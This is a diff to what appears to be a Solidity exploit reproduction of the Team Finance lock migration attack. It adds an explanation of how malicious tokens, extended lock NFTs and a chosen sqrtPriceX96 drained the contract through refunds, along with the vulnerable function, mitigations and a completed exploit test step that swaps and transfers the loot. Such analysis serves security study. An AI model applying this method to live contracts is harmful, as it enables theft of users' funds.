@@ -31,6 +31,9 @@ Attack Tx : https://etherscan.io/tx/0xb2e3ea72d353da43a2ac9a8f1670fd16463ab370e5
          id 15326: https://etherscan.io/tx/0x79ec728612867b3d82c0e7401e6ee1c533b240720c749b3968dea1464e59b2c4
          id 15327: https://etherscan.io/tx/0x51185fb580892706500d3b6eebb8698c27d900618021fb9b1797f4a774fffb04
 
+
+V3Migrator Proxy Deployment Tx: https://etherscan.io/tx/0x350dd9d6cdaba277af927345b7f1421d60b84601f7271799157204f3993766d2#eventlog
+
 Ethereum Transaction Viewer: https://openchain.xyz/trace/ethereum/[INSERT TX HASH]
 
 
@@ -55,13 +58,114 @@ Beiosin Alert : https://twitter.com/BeosinAlert/status/1585578499125178369
 
 Principle:  Business Logic - Arbitrary Token Attack
 
+The main vulnerability being exploited is locking a custom token using the setup of the locking position to perform a the migration
+from a Uniswap V2 pool to a V3. The attacker bypassed the migration controls by using protocol's NFT lock positions backed by thes malicious token. 
+
+Because the migrate() function refunds the difference after the migration, the attacker abused from this feature by manipulating the price
+of the tokens involved on each pool.
+
+The attacker provided the max sqrtPriceX96 and also used the malicious tokens to inflate the price of each pool receiving outstanding refunds
+draining the Lock contract via the migration process. 
+
+    function migrate(
+        uint256 _id,
+        IV3Migrator.MigrateParams calldata params,
+        bool noLiquidity,
+        uint160 sqrtPriceX96,
+        bool _mintNFT
+    )
+    external
+    payable
+    whenNotPaused
+    nonReentrant
+    {
+        ...
+        Items memory lockedERC20 = lockedToken[_id];
+        require(block.timestamp < lockedERC20.unlockTime, "Unlock time already reached");
+        require(_msgSender() == lockedERC20.withdrawalAddress, "Unauthorised sender");
+        require(!lockedERC20.withdrawn, "Already withdrawn");
+
+        uint256 totalSupplyBeforeMigrate = nonfungiblePositionManager.totalSupply();
+        
+        //scope for solving stack too deep error
+        {
+            uint256 ethBalanceBefore = address(this).balance;
+            uint256 token0BalanceBefore = IERC20(params.token0).balanceOf(address(this));
+            uint256 token1BalanceBefore = IERC20(params.token1).balanceOf(address(this));
+            
+            //initialize the pool if not yet initialized
+            if(noLiquidity) {
+                v3Migrator.createAndInitializePoolIfNecessary(params.token0, params.token1, params.fee, sqrtPriceX96);
+            }
+
+            IERC20(params.pair).approve(address(v3Migrator), params.liquidityToMigrate);
+
+            v3Migrator.migrate(params);
+
+            //refund eth or tokens
+            uint256 refundEth = address(this).balance - ethBalanceBefore;
+            (bool refundSuccess,) = _msgSender().call.value(refundEth)("");
+            require(refundSuccess, 'Refund ETH failed');
+
+            uint256 token0BalanceAfter = IERC20(params.token0).balanceOf(address(this));
+            uint256 refundToken0 = token0BalanceAfter - token0BalanceBefore;
+            if( refundToken0 > 0 ) {
+                require(IERC20(params.token0).transfer(_msgSender(), refundToken0));
+            }
+
+            uint256 token1BalanceAfter = IERC20(params.token1).balanceOf(address(this));
+            uint256 refundToken1 = token1BalanceAfter - token1BalanceBefore;
+            if( refundToken1 > 0 ) {
+                require(IERC20(params.token1).transfer(_msgSender(), refundToken1));
+            }
+        }
+        ...
+        emit LiquidityMigrated(_msgSender(), _id, newDepositId, tokenId);
+    }
 
 ATTACK:
-1)
+The process has two main parts: The Setup and The Attack. 
+
+THE SETUP:
+The transactions performed on this part were made in order to bypass the initial checks of migrate()
+
+1) Deploy a malicious inflationary token
+2) Get Team Finance Lock NFTs:
+     - Providing ETH to pay the fees
+     - Setting the attacker's contract as the withdrawal address
+     - Backing the NFT with the malicious token
+3) Extend the duration of each NFT to sometime in the future
+
+These three steps bypass the require statements by:
+   - Calling migrate after the extended period
+   - Performing the migration from the attacker's contract
+   - Not withdrawing the locked position
+
+Due to the weakness of those checks, the attacker now is able to bypass the migration access control 
+and specify any custom parameters in this process.
+
+THE ATTACK:
+Now that the TeamFinance Lock migrate() function is bypasseable by the attacker's contract and will also consider
+the malicious tokens as additional liquidity provided.
+
+1) Call migrate():
+   - For each NFT, target different V2 Pairs
+   - On every migration use sqrtPriceX96 = 79210883607084793911461085816. This gets a price factor equal to 0.999563867 (*)
+2) Exchange the loot for stablecoins using Curve, when applies
+3) Send the loot to the external attacker's account
+
+(*) Links and sources with more details on how this number is calculated, in the reproduction below.
+
 
 MITIGATIONS:
-1)
-
+1) The most general recomendation for cases like this one: beware of user input parameters.
+2) If the protocol allows users to provide arbitrary tokens to execute any type of logic, take into consideration
+that malicious tokens of any nature could be provided (hookable, custom implemenations, inflatable, etc.). 
+3) It is a good practise also, to set reasonable boundaries for some input parameters (such as the square root price)
+even if a function is meant to be permissioned or called by specific users to mitigate any loss of access control (private key compromised, 
+authentication bypass, etc).
+4) Carefully review and check migration processes as they will likely be called once most likely conveying token transfers of considerable
+amounts.
 */
 
 contract SpoofERC20 {
@@ -284,12 +388,17 @@ contract Exploit_TeamFinance is TestHarness, TokenBalanceTracker {
             params.deadline = block.timestamp + 500; // The attacker specified the deadline using a constant offset against the current timestamp
             params.refundAsETH = true; 
 
-            // [WIP]: We now have the parameters, need to continue the attack path thay is reverting.
-            // Need to solve the revert in the attack path and this is finished.
-
             teamFinanceLock.migrate(tokenIds[i], params, true, newPriceX96, false);
              
             _exchangeAndTransfer(tokenIds[i], migrationTokens0[i], migrationTokens1[i], pairs[i]);
+
+            /* 
+            The following step is not needed for the attack itself but it is made by the attacker. 
+            This interesting approval could have many reasons such as using automated attack scripts, having 
+            control of the contract's assets with an external account in case of a contingency, etc.
+            */
+
+            migrationTokens1[i].approve(attackerAddress_Two, type(uint256).max);
 
             unchecked {
                 ++i;
